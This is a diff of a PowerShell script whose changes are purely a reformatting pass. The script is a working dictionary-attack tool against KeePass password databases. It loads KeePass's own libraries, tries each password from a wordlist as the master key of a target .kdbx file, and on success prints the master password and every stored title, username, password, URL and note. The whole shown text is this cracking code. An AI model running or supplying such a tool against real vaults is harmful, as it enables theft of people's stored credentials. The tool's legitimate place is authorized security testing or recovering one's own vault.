@@ -51,188 +51,155 @@ $passwordList=""
 $Password=""
 
 
-
 #-----------------------------------------------------------[Functions]------------------------------------------------------------
 
-Function Load-KeePassBinarys{
-          param(
-          [Parameter(Mandatory=$true)]
-          [String]$path
-          )
-          Begin{ 
-                 if ((Test-Path $path) –eq $false) 
-                    {
-                    Write-Output "The path $path is invalid"
-                    write-output "Testing Default Path"
-                    If ((Test-Path "C:\Program Files (x86)\KeePass2x") –eq $true) 
-                    {
-                      $path="C:\Program Files (x86)\KeePass2x"
-                      Write-Output "Using Default Path $path"
-                    }
-                    }
-               }
-  
-          Process{
-                    Try { 
-                        [Reflection.Assembly]::LoadFile("$path\KeePass.exe")|Out-Null
-                        }Catch
-                            { 
-                             Write-warning "Unable Load KeePass Binarys - check path $path"
-                             break
-                            }
-                    Try { 
-                        [Reflection.Assembly]::LoadFile("$path\KeePass.XmlSerializers.dll")|Out-Null
-                        }catch 
-                            {
-                             Write-warning  "Unable Load KeePass Binarys - check path $path"
-                             break
-                            }
-          }
-  
-          End{
-           Write-Output "KeePass Binaries loaded from $path"
-          }
+function Load-KeePassBinarys {
+    param(
+        [Parameter(Mandatory=$true)]
+        [String]$path
+    )
+    begin { 
+        if((Test-Path $path) –eq $false) 
+        {
+            Write-Output "The path $path is invalid"
+            Write-Output "Testing Default Path"
+            if((Test-Path "C:\Program Files (x86)\KeePass2x") –eq $true)
+            {
+                $path="C:\Program Files (x86)\KeePass2x"
+                Write-Output "Using Default Path $path"
             }
-            
- function try-key($x){
-    $Key = new-object KeePassLib.Keys.CompositeKey
+        }
+    }
+    process {
+        try { 
+            [Reflection.Assembly]::LoadFile("$path\KeePass.exe")|Out-Null
+        } catch
+        { 
+            Write-Warning "Unable Load KeePass Binarys - check path $path"
+            break
+        }
+        try { 
+            [Reflection.Assembly]::LoadFile("$path\KeePass.XmlSerializers.dll")|Out-Null
+        } catch 
+        {
+            Write-Warning  "Unable Load KeePass Binarys - check path $path"
+            break
+        }
+    }
+    end {
+        Write-Output "KeePass Binaries loaded from $path"
+    }
+}
+
+function try-key($x) {
+    $Key = New-Object KeePassLib.Keys.CompositeKey
     $Key.AddUserKey((New-Object KeePassLib.Keys.KcpPassword($x)));
-    try{
-    
-    $Database.Open($IOConnectionInfo,$Key,$null)
-        
+    try {
+        $Database.Open($IOConnectionInfo,$Key,$null)
+
         $items=""
         Write-Warning "Master Password Found = $x "
-        write-output "================="
+        Write-Output "================="
         $Items = $Database.RootGroup.GetObjects($true, $true)
         foreach($Item in $Items)
         {
-            write-output Title=$($Item.Strings.ReadSafe("Title"))
-            write-output UserName=$($Item.Strings.ReadSafe("UserName"))
-            write-output Password=$($Item.Strings.ReadSafe("Password"))
-            write-output URL=$($Item.Strings.ReadSafe("URL"))
-            write-output Note=$($Item.Strings.ReadSafe("Note"))      
-            write-output "================="
-              
+            Write-Output Title=$($Item.Strings.ReadSafe("Title"))
+            Write-Output UserName=$($Item.Strings.ReadSafe("UserName"))
+            Write-Output Password=$($Item.Strings.ReadSafe("Password"))
+            Write-Output URL=$($Item.Strings.ReadSafe("URL"))
+            Write-Output Note=$($Item.Strings.ReadSafe("Note"))
+            Write-Output "================="
         }
-        $Database.Close()  
-        
-            break   
-   
+        $Database.Close()
+        break
     }
-    catch{
-    
+    catch {
+
     }
+}
 
-  }
- Function load-passwordfile{
-          Param(
-          [Parameter(Mandatory=$true)]
-          [string]$filepath
-
-          )
-  
-          Begin{
-
-                If ((Test-Path $filepath) –eq $false) {
-                Write-Output "The Password File Path: $path is invalid"
-                write-output "Checking for Default List"
-    
-                If ((Test-Path ".\pwdlist.txt") –eq $true) {
+function load-passwordfile{
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$filepath
+    )
+    begin {
+        if ((Test-Path $filepath) –eq $false) {
+            Write-Output "The Password File Path: $path is invalid"
+            Write-Output "Checking for Default List"
+            if((Test-Path ".\pwdlist.txt") –eq $true)
+            {
                 $filepath=".\pwdlist.txt"
                 Write-Output "Using Default Password File:$filepath"
-                }
-                else
-                {
+            }
+            else
+            {
                 Write-Output "Unable to locate default password file : pwdlist.txt"
                 break
-                }
-
+            }
         }
-    
-          }
-  
-          Process{
-                write-output "loading pwd list from $filepath"
-                $pwdfile = New-Object System.IO.StreamReader -Arg $filepath
-                $count=0
-                $sw = [Diagnostics.Stopwatch]::StartNew()
-                while ($password = $pwdfile.ReadLine()) {
-                try-key($password)
-        
-                if ($count % 1000 -eq 0)
-                {
+    }
+    process {
+        Write-Output "loading pwd list from $filepath"
+        $pwdfile = New-Object System.IO.StreamReader -Arg $filepath
+        $count=0
+        $sw = [Diagnostics.Stopwatch]::StartNew()
+        while($password = $pwdfile.ReadLine()) {
+            try-key($password)
+            if ($count % 1000 -eq 0)
+            {
                 Write-Output "Number of Keys checked against Database:$count Elapsed Time = $($sw.Elapsed)"
-
-                }
-                $count++
-                }
-        
-
-          }
-  
-          End{
-           $pwdfile.close()
-           $sw.Stop()
-
-          }
             }
- function check-kdbxfile{
-        Param(
-          [Parameter(Mandatory=$true)]
-          [string]$targetfile
-
-          )
-  
-          Begin{
-
-                If ((Test-Path $targetfile) –eq $false) {
-                Write-Output "The Target File Path: $path is invalid"
-                Break
+            $count++
         }
-    
-          }
-  
-          Process{
-                write-output "Confirmed Target Path"
-                $IOconnectionInfo.Path =$targetfile
-                Return $targetfile
-       
-          }
-  
-          End{
-   
-          }
-            }
- Function crack-keepassfile{
-          Param(
-          [Parameter(Mandatory=$true)]
-          [string]$binpath,
-          [string]$pwdpath,
-          [string]$targetfile
-  
-  
-          )
-  
-          Begin{
-          load-keepassbinarys -path $binpath
-          $Database = new-object KeePassLib.PwDatabase
-          $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
-          $target=check-kdbxfile -target $targetfile
-          }
-  
-          Process{
-   
-          load-passwordfile -filepath $pwdpath
- 
-          }
-  
-          End{
-   
-          }
-            }
+    }
+    end {
+        $pwdfile.close()
+        $sw.Stop()
+    }
+}
+
+function check-kdbxfile{
+    Param(
+        [Parameter(Mandatory=$true)]
+        [string]$targetfile
+    )
+    begin {
+        if((Test-Path $targetfile) –eq $false) {
+            Write-Output "The Target File Path: $path is invalid"
+            break
+        }
+    }
+    process {
+        Write-Output "Confirmed Target Path"
+        $IOconnectionInfo.Path = $targetfile
+        return $targetfile
+    }
+    end {
+
+    }
+}
+
+function crack-keepassfile{
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$binpath,
+        [string]$pwdpath,
+        [string]$targetfile
+    )
+    begin {
+        load-keepassbinarys -path $binpath
+        $Database = New-Object KeePassLib.PwDatabase
+        $IOConnectionInfo = New-Object KeePassLib.Serialization.IOConnectionInfo
+        $target=check-kdbxfile -target $targetfile
+    }
+    process {
+        load-passwordfile -filepath $pwdpath
+    }
+    end {
+
+    }
+}
 
 
 #-----------------------------------------------------------[Execution]------------------------------------------------------------
-
-
